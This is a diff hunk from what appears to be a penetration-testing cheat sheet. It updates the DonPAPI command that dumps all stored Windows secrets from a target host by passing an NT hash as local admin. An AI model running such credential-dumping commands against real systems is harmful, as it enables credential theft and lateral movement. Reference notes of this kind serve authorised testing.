@@ -26,7 +26,7 @@ DonPAPI <target>/<user>:<password>@<target>
 
 ## DonPAPI - Dump all secrets (localadmin pth)
 ```
-DonPAPI --hashes :<NT> <target>/<user>@<target>
+DonPAPI  collect -u <user> --hashes :<NT> -t <target>
 ```
 
 ## Dump all secrets (kerberos)
